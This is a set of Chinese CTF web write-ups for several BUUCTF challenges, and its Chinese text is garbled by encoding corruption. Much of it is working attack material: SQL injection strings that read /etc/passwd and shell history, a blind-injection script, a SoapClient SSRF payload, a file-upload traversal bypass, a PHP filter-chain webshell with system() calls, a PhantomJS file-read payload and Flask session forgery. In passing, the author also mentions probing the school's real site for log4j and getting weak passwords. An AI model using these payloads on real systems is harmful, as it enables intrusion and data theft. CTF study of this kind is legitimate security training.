isValidBlog () { $blog = $this-\u0026gt;blog; return preg_match(\u0026#34;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\u0026#34;, $blog); } } æœ‰ä¸ªcurlï¼Œååºåˆ—åŒ–ç‚¹\n$age = 18; $blog = \u0026#34;file:///var/www/html/flag.php\u0026#34;; $name = \u0026#34;amiz\u0026#34;; $a = new UserInfo($name,$age,$blog); echo serialize($a); O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;amiz\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/flag.php\u0026#34;;} ä½†æ˜¯æœ¬èº«è¿™ç©æ„è¿˜å¾—æœ‰ä¸ªæ³¨å…¥ç‚¹ï¼Œå®ƒåœ¨urlæœ€åçš„noå‚æ•°å¤„\n/view.php?no=1 order by 4%23\t# 5æŠ¥é”™ å…±4åˆ— ä¸ååºåˆ—åŒ–ä¹Ÿè¡Œï¼Œå®ƒæ²¡è¿‡æ»¤load_fileç›´æ¥å°±è¯»æ–‡ä»¶äº†\n/view.php?no=-1 union/**/select/**/1,load_file(\u0026#34;/var/www/html/flag.php\u0026#34;),3,4%23 æœ‰ç‚¹å¥‡æ€ªçš„ï¼Œä½ è¯´å®ƒè¿‡æ»¤ç©ºæ ¼ï¼Œä½†æ˜¯å‰é¢é‚£ä¸ªä¸ç”¨æ³¨é‡Šä¹Ÿå¯ä»¥ï¼Œè€Œä¸”å‰é¢å‚æ•°æ˜¯1è¿˜ä¸è¡Œ\npage 03 [ç½‘é¼æ¯ 2018]Comment | gitæ³„éœ² sqli äºŒæ¬¡æ³¨å…¥ load_file å‘å¸–ä¼šå…ˆè¦æ±‚ç™»å½•ï¼Œæç¤ºzhangwei: zhangwei***ï¼Œç›²çŒœ666ï¼Œç™»å…¥\nå¸–å­çš„è¯¦æƒ…é¡µå¯ä»¥æäº¤ç•™è¨€ï¼Œè¿™é‡Œæœ‰xssï¼ˆä½†æ˜¯æ²¡å•¥ç”¨ åˆæ²¡botï¼‰ï¼Œf12æœ‰ä¸€å¥æç¤ºç¨‹åºå‘˜GITå†™ä¸€åŠè·‘è·¯äº†,éƒ½æ²¡æ¥å¾—åŠCommit :)ï¼Œç”¨Githackerçœ‹çœ‹æºç \ngithacker --url http://c7839413-2569-4342-ac29-8b5810a4c8c4.node4.buuoj.cn:81/ --folder result å› ä¸ºæç¤ºè¯´æœ‰ä¸€ä¸ªè®°å½•æ²¡æœ‰commitï¼Œæˆ‘ä»¬å°è¯•æ¢å¤\ngit log --reflog\t# æœ‰ä¸€æ¡åé¢å¸¦æ‹¬å·(refs/stash) æš‚å­˜åŒº sudo git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c å¾—åˆ°å®Œæ•´çš„æºç \n\u0026lt;?php include \u0026#34;mysql.php\u0026#34;; session_start(); if($_SESSION[\u0026#39;login\u0026#39;] != \u0026#39;yes\u0026#39;){ header(\u0026#34;Location: ./login.php\u0026#34;); die(); } if(isset($_GET[\u0026#39;do\u0026#39;])){ switch ($_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;write\u0026#39;: $category = addslashes($_POST[\u0026#39;category\u0026#39;]); $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into board set category = \u0026#39;$category\u0026#39;, title = \u0026#39;$title\u0026#39;, content = \u0026#39;$content\u0026#39;\u0026#34;; $result = mysql_query($sql); header(\u0026#34;Location: ./index.php\u0026#34;); break; case \u0026#39;comment\u0026#39;: $bo_id = addslashes($_POST[\u0026#39;bo_id\u0026#39;]); $sql = \u0026#34;select category from board where id=\u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num\u0026gt;0){ $category = mysql_fetch_array($result)[\u0026#39;category\u0026#39;]; $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into comment set category = \u0026#39;$category\u0026#39;, content = \u0026#39;$content\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); } header(\u0026#34;Location: ./comment.php?id=$bo_id\u0026#34;); break; default: header(\u0026#34;Location: ./index.php\u0026#34;); } } else{ header(\u0026#34;Location: ./index.php\u0026#34;); } ?\u0026gt; å¯ä»¥çœ‹åˆ°åªæœ‰categoryæ²¡æœ‰è¢«addslashesè¿‡æ»¤ï¼Œæ˜¯ç›´æ¥å°†æ‰§è¡Œçš„ç»“æœè¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬çš„å…¥æ‰‹ç‚¹ï¼›å…ˆåœ¨writeå¤„æ’å…¥ï¼Œå†åœ¨commentå¤„é—­åˆå‰é¢çš„æ³¨é‡Šç¬¦ï¼Œæ‰§è¡Œç»“æœ\nwrite: category=\u0026#39;,content=user(),/* comment: content=*/# write: category=\u0026#39;,content=(select load_file(\u0026#39;/etc/passwd\u0026#39;)),/* comment: content=*/# çœ‹åˆ°æœ€åä¸€è¡Œçš„wwwç”¨æˆ·ï¼Œç»§ç»­æŸ¥çœ‹.bash_historyè®°å½•\nwrite: category=\u0026#39;,content=(select load_file(\u0026#39;/home/www/.bash_history\u0026#39;)),/* comment: content=*/# çœ‹åˆ°äº†.DS_Storeæ–‡ä»¶ï¼Œåœ¨linuxä¸­å®ƒçš„ä½ç½®ä¸€èˆ¬åœ¨/tmpä¸‹ï¼ŒåŒæ—¶.DS_Storeä¸­ç»å¸¸æœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥åŠ ä¸€å±‚hexå†è¯»å‡º\nwrite: category=\u0026#39;,content=(select hex(load_file(\u0026#39;/tmp/html/.DS_Store\u0026#39;))),/* comment: content=*/# çœ‹åˆ°flag_8946e1ff1ee3e40f.phpï¼Œä¹ŸåŠ ä¸€å±‚hex\nwrite: category=\u0026#39;,content=(select hex(load_file(\u0026#39;/var/www/html/flag_8946e1ff1ee3e40f.php\u0026#39;))),/* comment: content=*/# â€”â€”â€”â€”é›€é£Ÿå¾ˆç‰›é€¼çš„äºŒæ¬¡æ³¨å…¥\npage 07 [FireshellCTF2020]URL TO PDF | ssrf ä¼šè®¿é—®ç»™å‡ºçš„ç½‘å€ï¼Œå¹¶æŠŠç»“æœè½¬ä¸ºpdfå‘ˆç°å‡ºæ¥\nè¿™ä¸ªè¯·æ±‚å¤´æ˜¾ç¤ºæ˜¯WeasyPrint 51ï¼Œgoogleå¯ä»¥æœåˆ°è¿™ä¸€ç¯‡https://hackerone.com/reports/508123\nå¦‚æœé¡µé¢ä¸Šå­˜åœ¨è¿™æ ·çš„æ ‡ç­¾\n\u0026lt;link rel=\u0026#34;attachment\u0026#34; href=\u0026#34;file:///flag\u0026#34;\u0026gt; æˆ–è€…\n\u0026lt;a rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file:///flag\u0026#39;\u0026gt; å°±ç›¸å½“äºSSRFè¯·æ±‚äº†ï¼Œå¹¶æŠŠç»“æœé™„åˆ°pdfä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨binwalkåˆ†ç¦»ä¸€ä¸‹å†…å®¹\nbinwalk -e xxx.pdf cat *|grep flag å‚è€ƒï¼šwp\n[FireshellCTF2020]ScreenShooter | cve-2019-17221 LFI è·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ ·ï¼Œä¸è¿‡åŒºåˆ«æ˜¯ä¼šè¿”å›æ‹çš„ç…§ç‰‡\nçœ‹è¯·æ±‚å¤´ç”¨çš„æ˜¯PhantomJSï¼Œæœåˆ°äº†è¿™æ ·ä¸€ç¯‡ï¼šPhantonJS_Arbitrary_File_Read.pdfï¼Œä¸€ä¸ªå·²çŸ¥çš„cve-2019-17221\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var amiz; amiz = new XMLHttpRequest; amiz.onload = function(){ document.write(this.responseText) }; amiz.open(\u0026#34;GET\u0026#34;,\u0026#34;file:///flag\u0026#34;); a.send(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä¼šé€ æˆXHRè¯·æ±‚ï¼Œä»»æ„æ–‡ä»¶è¯»å–\n[De1CTF 2019]ShellShellShell | sqli æ—¶é—´ç›²æ³¨ soapååºåˆ—åŒ– å†…ç½‘ upload æ˜¯N1ctf2018çš„easyphp+2018ä¸Šæµ·å¸‚èµ›web3çš„ç¼åˆ+æ”¹ç¼–ï¼Œä¸è¿‡è¿™ä¿©æˆ‘éƒ½æ²¡åšè¿‡ï¼Œè¿™æ˜¯N1é¢˜çš„wpï¼Œè¿™æ˜¯web3çš„wp\né¦–å…ˆæ˜¯æºç æ³„éœ²\n/index.php~ /user.php~ /config.php~ /views/index /views/login /views/logout /views/register /views/profile /views/publish /views/delete /views/phpinfo åœ¨user.phpä¸­æœ‰å¾ˆå¤šsqlçš„æ“ä½œï¼Œç»“åˆè¿™äº›å‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªåä¸ºctf_usersdçš„è¡¨ï¼Œæœ‰username, password, allow_diff_ip, id, is_admin, ipè¿™å‡ åˆ—ï¼›åœ¨registerå‡½æ•°é¢å¤–æœ‰å‡ºé¢˜äººçš„ä¸€ä¸ªæ³¨é‡Šåšæç¤ºç”¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€å¥ç›´æ¥æŠŠis_adminèµ‹å€¼ä¸º0\nè·Ÿå…¥config.phpçœ‹æœ‰å…³äºsqlçš„å¤„ç†\nåŒ¹é…åå¼•å·ç„¶åä¼šè¢«æ›¿æ¢ä¸ºå•å¼•å·ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬sqlæ³¨å…¥çš„payloadç”±å•å¼•å·æ¢æˆåå¼•å·å³å¯\nç”±äºæ³¨å†Œæˆä¸æˆåŠŸä»€ä¹ˆçš„å›æ˜¾æ²¡æœ‰å·®åˆ«ï¼Œæ‰€ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼›å¦å¤–è¿™é‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹éƒ½å¯ä»¥sqliï¼Œä¸€ä¸ªæ˜¯register()å¤„ä¸€ä¸ªæ˜¯publishå¤„\npublishè¿™é‡Œæ˜¯æ³¨å†Œåå°±å¯ä»¥ç›´æ¥ä¼ å‚ï¼Œè€Œregisteré‚£é‡Œè¿˜è¦ç”¨md5ä¸åœåœ°ç”ŸæˆéªŒè¯ç ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æ³¨å†Œä¸€ä¸ªå·ç„¶åç”¨publishè¿™é‡Œä½œä¸ºæ³¨å…¥ç‚¹\nimport hashlib def func(md5_val): for x in range(999999, 100000000): md5_value=hashlib.md5(str(x).encode(encoding=\u0026#39;utf-8\u0026#39;)).hexdigest() if md5_value[:5]==md5_val: return str(x) if __name__ == \u0026#39;__main__\u0026#39;: print(func(\u0026#39;ac7a2\u0026#39;)) æ—¶é—´ç›²æ³¨å»ºè®®è¿˜æ˜¯ä¸¤ä¸ªforå¾ªç¯å§ï¼ŒäºŒåˆ†ä¸çŸ¥é“ä¸ºå•¥ä¸€ç›´å‡ºé—®é¢˜\nimport requests url=\u0026#34;http://a4a900d6-ddc6-42eb-b95c-7e63d56d9bba.node4.buuoj.cn:81/index.php?action=publish\u0026#34; cookie = {\u0026#34;PHPSESSID\u0026#34;:\u0026#34;5j1p272lfmi425cpmkv9lik9o7\u0026#34;} k=\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; flag=\u0026#34;\u0026#34; for i in range(50): for j in k: j = ord(j) data={ \u0026#39;mood\u0026#39;:\u0026#39;0\u0026#39;, \u0026#39;signature\u0026#39;:\u0026#39;1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#\u0026#39;.format(i,j) } try: r=requests.post(url,data=data,cookies=cookie,timeout=(2,2)) except: flag+=chr(j) print(flag) break è·‘å‡ºæ¥md5è§£å¯†åå¾—åˆ°jaivypassword\næœ‰å¯†ç å’Œè´¦å·å´ç™»ä¸äº†ï¼Œå› ä¸ºä»–åœ¨sqlè¡¨ä¸­è®¾ç½®äº†allow_diff_ipï¼Œåªæœ‰ç®¡ç†å‘˜åœ°å€æ‰å¯ä»¥ï¼Œå¹¶ä¸”ä½¿ç”¨äº†$_SERVER['REMOTE_ADDR']\næ²¡æ³•xffç»•è¿‡ï¼Œåªèƒ½æ‰¾ä¸€å¤„ssrfçš„ç‚¹ï¼›ä»ä¹‹å‰çš„phpinfoæ³„éœ²å¯ä»¥çœ‹åˆ°å¼€å¯äº†soapæ‰©å±•ï¼Œç°åœ¨å°±ç¼ºä¸€ä¸ªååºåˆ—åŒ–ç‚¹äº†\nè¿™é‡Œçš„row[2]å°±æ˜¯moodï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å‚æ•°ï¼Œå°±æ˜¯æ³¨å…¥ç‚¹äº†\næ“ä½œçš„æ—¶å€™è¦æ³¨æ„ï¼Œpublishæ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•åæ‰èƒ½è¿›è¡Œçš„æ“ä½œï¼Œè€Œæˆ‘ä»¬ä¼ å‚æ˜¯ä¸ºäº†è®©adminå¾—ä»¥ç™»å½•ï¼Œè¿™é‡Œé‡‡å–çš„æ–¹å¼æ˜¯ç”¨å¦ä¸€ä¸ªæœªç™»å½•é¡µé¢çš„cookieçš„codeç”Ÿæˆpayloadï¼Œåœ¨å·²ç™»å½•çš„è´¦å·ä¸Špublishå¹¶è§¦å‘ååºåˆ—åŒ–ï¼Œç„¶åä¹‹å‰çš„æœªç™»å½•é¡µé¢åˆ·æ–°å³å¯ç›´æ¥è¿›å…¥ä¸ªäººä¿¡æ¯é¡µé¢äº†\n\u0026lt;?php $target = \u0026#39;http://127.0.0.1/index.php?action=login\u0026#39;; $post_string = \u0026#39;username=admin\u0026amp;password=jaivypassword\u0026amp;code=1243998\u0026#39;; $headers = array( \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;, \u0026#39;Cookie: PHPSESSID=meailth0scq7kni7m5ihvr7974\u0026#39; ); $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;amiz^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers).\u0026#39;^^Content-Length: \u0026#39;.(string)strlen($post_string).\u0026#39;^^^^\u0026#39;.$post_string,\u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;aaab\u0026#34;)); $aaa = serialize($b); $aaa = str_replace(\u0026#39;^^\u0026#39;,\u0026#34;\\r\\n\u0026#34;,$aaa); $aaa = str_replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,$aaa); echo bin2hex($aaa); ?\u0026gt; ä¹‹åadminçš„publishé¡µé¢å¯ä»¥ç›´æ¥ä¼ webshellï¼Œæç¤ºflagåœ¨å†…ç½‘ï¼Œç”¨èšå‰‘è¿æ¥æ‰«ä¸€ä¸‹å†…ç½‘\nåœ¨å¤–ç½‘å°±å¯ä»¥ç›´æ¥è®¿é—®äº†\n\u0026lt;?php $sandbox = \u0026#39;/var/sandbox/\u0026#39; . md5(\u0026#34;prefix\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]){ $filename = !empty($_POST[\u0026#39;file\u0026#39;]) ? $_POST[\u0026#39;file\u0026#39;] : $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; // æ–‡ä»¶åå’Œåç¼€åˆ†ç¦» if (!is_array($filename)) { // æˆ‘ä»¬ä¼ å…¥å’Œæ–‡ä»¶ç±»å‹fileåŒåçš„æ•°ç»„ file[] 3ä¸ªå‚æ•° $filename = explode(\u0026#39;.\u0026#39;, $filename); } $ext = end($filename);\t// å–çš„æ˜¯file[0] if($ext==$filename[count($filename) - 1]){ // filename[count(filename)-1]=file[2] die(\u0026#34;try again!!!\u0026#34;); // file[0]=/../amiz.php\tfile[2]=222\tfile[1]=111 } $new_name = (string)rand(100,999).\u0026#34;.\u0026#34;.$ext; // éšæœºæ–‡ä»¶å /../è·¯å¾„ç©¿è¶Šç»•è¿‡ move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$new_name); $_ = $_POST[\u0026#39;hello\u0026#39;]; if(@substr(file($_)[0],0,6)===\u0026#39;@\u0026lt;?php\u0026#39;){ // @\u0026lt;?php `find /etc -name *flag* -exec cat {} +`; if(strpos($_,$new_name)===false) { include($_); } else { echo \u0026#34;you can do it!\u0026#34;; } } unlink($new_name);\t// ç»•è¿‡ ../xyz.php æˆ–xyz.php/. ä¸ä¼šè¢«åˆ é™¤ } else{ highlight_file(__FILE__); } ç»•è¿‡æ–¹å¼å‚è€ƒ-\u0026gt;2018ä¸Šæµ·web2\nç„¶åæ„é€ phpçš„curlï¼Œä¸Šä¼ åˆ°uploadå¤„è®©å®ƒè§¦å‘ï¼ˆå¤ªå·§å¦™äº†å§~ ç®€ç›´æ˜¯å¤©ç±~\næˆ‘çœ‹èµµå¸ˆå‚…æ˜¯ç”¨postmanç›´æ¥ç”Ÿæˆçš„payloadï¼Œå¯æ˜¯æˆ‘ç”Ÿæˆçš„è·Ÿä»–çš„ç‰ˆæœ¬çœ‹èµ·æ¥å®Œå…¨ä¸ä¸€æ ·ï¼Œå°‘äº†postè¯¥æœ‰çš„å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚åˆ†å‰²çº¿å•Šï¼Œæ–‡ä»¶ç±»å‹å’Œå†…å®¹ä»€ä¹ˆçš„ï¼Œä¸çŸ¥é“ä¸ºå•¥\n\u0026lt;?php $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://10.0.39.6/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 30, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; \u0026#34;------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;amiz.php\\\u0026#34;\\r\\nContent-Type: false\\r\\n\\r\\n@\u0026lt;?php echo `find /etc -name *flag* -exec cat {} +`;\\r\\n\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;hello\\\u0026#34;\\r\\n\\r\\namiz.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file[2]\\\u0026#34;\\r\\n\\r\\n222\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file[1]\\\u0026#34;\\r\\n\\r\\n111\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file[0]\\\u0026#34;\\r\\n\\r\\n/../amiz.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\u0026#34;submit\\\u0026#34;\\r\\n\\r\\nSubmit\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\u0026#34;, CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22\u0026#34;, \u0026#34;cache-control: no-cache\u0026#34;, \u0026#34;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } ä¸Šä¼ ååˆ°/upload/s1.phpé¡µé¢å°±å¯ä»¥çœ‹åˆ°flagäº†\nä¸Šé¢phpè¿˜æœ‰ä¸ªç»•è¿‡unlinkçš„åœ°æ–¹ï¼Œåœ¨n1çš„é¢˜é‡Œæ˜¯ç”¨ä¸€ä¸ª.shæ‰§è¡Œçš„åˆ é™¤å‘½ä»¤ï¼Œé‚£æ ·çš„è¯å¯ä»¥ç”¨-asdd.phpè¿™æ ·ç»•è¿‡ï¼Œå› ä¸ºå¼€å¤´æ˜¯ä¸ª-\nâ€”â€”â€”â€”â€”â€”æ€»ç»“ï¼šè‚¥è‚ å¤æ‚çš„ä¸€é“é¢˜ï¼Œæ‚æ‰äº†md5ç¢°æ’ã€SoapClientåŸç”Ÿç±»ååºåˆ—åŒ–ã€å†…ç½‘æ‰«æã€SSRFã€phpçš„trickç­‰ç­‰ä¸€ç³»åˆ—è€ƒç‚¹ï¼Œå°±åˆ«è¯´ç°åšäº†ï¼Œå°±æ˜¯å¤ç°çš„éš¾åº¦ä¹ŸæŒºé«˜çš„ï¼Œå¸ˆå‚…ä»¬ç‰›é€¼\nå‚è€ƒï¼šwp1 | wp2 | wp11 | wp12\n[WMCTF2020]Web Check in 2.0 | LFI rce æœ¬æ¥ä¸‹åˆ2ç‚¹å°±è¯¥å¼€å§‹åšçš„ï¼Œä½†æ˜¯ä¸‹åˆå»è¯•å­¦æ ¡ç«™çš„log4j2äº†ï¼Œç»“æœè¿™ä¸ªæ´æ²¡è¯•å‡ºæ¥ æ‹¿äº†ä¸€äº›å¼±å£ä»¤ï¼Œæ— å¿ƒæ’æŸ³äº†å±äºæ˜¯\nstring(62) \u0026#34;Sandbox:/var/www/html/sandbox/437a765460ed3657d5fb80d24456c9e5\u0026#34;\u0026lt;?php //PHP 7.0.33 Apache/2.4.25 error_reporting(0); $sandbox = \u0026#39;/var/www/html/sandbox/\u0026#39; . md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); // æ²™ç›’ è·¯å¾„ç¡®å®š\u0026amp;å·²çŸ¥ @mkdir($sandbox); @chdir($sandbox); var_dump(\u0026#34;Sandbox:\u0026#34;.$sandbox); highlight_file(__FILE__); if(isset($_GET[\u0026#39;content\u0026#39;])) { $content = $_GET[\u0026#39;content\u0026#39;]; if(preg_match(\u0026#39;/iconv|UCS|UTF|rot|quoted|base64/i\u0026#39;,$content)) // ç¦äº†ä¸€äº›ä¼ªåè®®è¯»æ–‡ä»¶çš„ç¼–ç æ–¹å¼ die(\u0026#39;hacker\u0026#39;); if(file_exists($content)) require_once($content); // æ–‡ä»¶åŒ…å« file_put_contents($content,\u0026#39;\u0026lt;?php exit();\u0026#39;.$content); // æ­»äº¡exit()ç»•è¿‡ } ä¸€ç‚¹ç®€å•åˆ†æå†™æ³¨é‡Šäº†ï¼Œé¦–å…ˆæ˜¯ä¼ªåè®®çš„éƒ¨åˆ†ï¼Œfile_put_contents()æ”¯æŒä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶è¦å…ˆurldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å‚çš„æ—¶å€™å¯ä»¥å†ç¼–ä¸€æ¬¡ç \nå‡ºé¢˜äººçš„è¿™ç¯‡åšå®¢å†™çš„ç‰¹åˆ«è¯¦ç»†ï¼šå…³äºfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•\nè¿œç¨‹ç¯å¢ƒä¸­%25è¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬æ„é€ åˆ«çš„æ–¹å¼çš„2æ¬¡ç¼–ç ï¼Œæ¯”å¦‚%7%23-\u0026gt;%72-\u0026gt;rå°±å¯ä»¥äº†\n\u0026lt;?php $char = \u0026#39;r\u0026#39;; #æ„é€ rçš„äºŒæ¬¡ç¼–ç  for ($ascii1 = 0; $ascii1 \u0026lt; 256; $ascii1++) { for ($ascii2 = 0; $ascii2 \u0026lt; 256; $ascii2++) { $aaa = \u0026#39;%\u0026#39;.$ascii1.\u0026#39;%\u0026#39;.$ascii2; if(urldecode(urldecode($aaa)) == $char){ echo $char.\u0026#39;: \u0026#39;.$aaa; echo \u0026#34;\\n\u0026#34;; } } } ?\u0026gt; æˆ‘ä»¬é€‰æ‹©rot13ç»•è¿‡\nphp://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0deval($_GET[1]);?\u0026gt;/resource=Cyc1e.php ä¸Šä¼ çš„å†…å®¹å°±ä¼šåˆ°Cycle.phpä¸­ï¼Œ?1=system('ls');ï¼Œ?1=system('cat /flag_2233_elkf3ifj34ij3orf3fk4');\nå‚è€ƒï¼šwp\n***[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board | ssti flask-session tensorflow flaskï¼Œé¡µé¢æœ‰ä¸‰ä¸ªè¾“å…¥æ¡†ï¼Œè¿˜æœ‰æ ‡å¿—æ€§çš„sessionï¼ŒAuthorè¾“å…¥æ¡†å¤„å­˜åœ¨SSTIï¼Œå°è¯•è·å–keyæ¥ä¼ªé€ session\n'SECRET_KEY': '1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI'\nè¿™é‡Œä¼ªé€ çš„æ—¶å€™è¦æ³¨æ„flask session cookie managerè§£å¯†å‡ºæ¥çš„æ—¶å€™æŠŠFalseçš„å¤§å†™ç»™å»æ‰äº†ï¼Œæˆ‘ä»¬æ„é€ å›å»çš„æ—¶å€™åº”è¯¥ç”¨å¤§å†™å¼€å¤´çš„\npython3 flask_session_cookie_manager3.py encode -s \u0026#39;1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI\u0026#39; -t \u0026#34;{\u0026#39;admin\u0026#39;:True}\u0026#34; åˆ°/adminå¤„æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹\nçœ‹é¡µé¢æºç å‘ç°è¿˜æœ‰æç¤º\nä¸‹è½½/admin/model_downloadï¼Œå¾—åˆ°è¿™ä¹ˆä¸ªç©æ„\n/admin/source_thanoså¯ä»¥ç›´æ¥è®¿é—®\nå°±ä»–å¦ˆç¦»è°±ï¼Œè¿™ä¸ªæºç æ˜¯éšæœºæ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æ˜¾ç¤ºä½ç½®å›ºå®šï¼Œå¾—æä¸ªè„šæœ¬åšå¤åŸ\nimport requests url = \u0026#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos\u0026#39; r = requests.get(url) source = r.text for j in range(10): r = requests.get(url) for i in range(len(source)): if source[i].isspace(): source = source[:i] + r.text[i] + source[i+1:] print(source) # coding=utf8 from flask import Flask, flash, send_file import random from datetime import datetime import zipfile # init app app = Flask(__name__) app.secret_key = \u0026#39;\u0026#39;.join(random.choice(\u0026#34;il1I|\u0026#34;) for i in range(40)) print(app.secret_key) from flask import Response from flask import request, session from flask import redirect, url_for, safe_join, abort from flask import render_template_string from data import data post_storage = data site_title = \u0026#34;A Flask Message Board\u0026#34; site_description = \u0026#34;Just leave what you want to say.\u0026#34; # %% tf/load.py import tensorflow as tf from tensorflow.python import pywrap_tensorflow def init(model_path): \u0026#39;\u0026#39;\u0026#39; This model is given by a famous hacker ! \u0026#39;\u0026#39;\u0026#39; new_sess = tf.Session() meta_file = model_path + \u0026#34;.meta\u0026#34; model = model_path saver = tf.train.import_meta_graph(meta_file) saver.restore(new_sess, model) return new_sess def renew(sess, model_path): sess.close() return init(model_path) def predict(sess, x): \u0026#39;\u0026#39;\u0026#39; :param x: input number x sess: tensorflow session :return: b\u0026#39;You are: *\u0026#39; \u0026#39;\u0026#39;\u0026#39; y = sess.graph.get_tensor_by_name(\u0026#34;y:0\u0026#34;) y_out = sess.run(y, {\u0026#34;x:0\u0026#34;: x}) return y_out tf_path = \u0026#34;tf/detection_model/detection\u0026#34; sess = init(tf_path) # %% tf end def check_bot(input_str): r = predict(sess, sum(map(ord, input_str))) return r if isinstance(r, str) else r.decode() def render_template(filename, **args): with open(safe_join(app.template_folder, filename), encoding=\u0026#39;utf8\u0026#39;) as f: template = f.read() name = session.get(\u0026#39;name\u0026#39;, \u0026#39;anonymous\u0026#39;)[:10] # Someone call me to add a remembered_name function # But I\u0026#39;m just familiar with PHP !!! # return render_template_string( # template.replace(\u0026#39;$remembered_name\u0026#39;, name) # .replace(\u0026#39;$site_description\u0026#39;, site_description) # .replace(\u0026#39;$site_title\u0026#39;, site_title), **args) return render_template_string( template.replace(\u0026#39;$remembered_name\u0026#39;, name), site_description=site_description, site_title=site_title, **args) @app.route(\u0026#39;/\u0026#39;) def index(): global post_storage session[\u0026#39;admin\u0026#39;] = session.get(\u0026#39;admin\u0026#39;, False) if len(post_storage) \u0026gt; 20: post_storage = post_storage[-20:] return render_template(\u0026#39;index.html\u0026#39;, posts=post_storage) 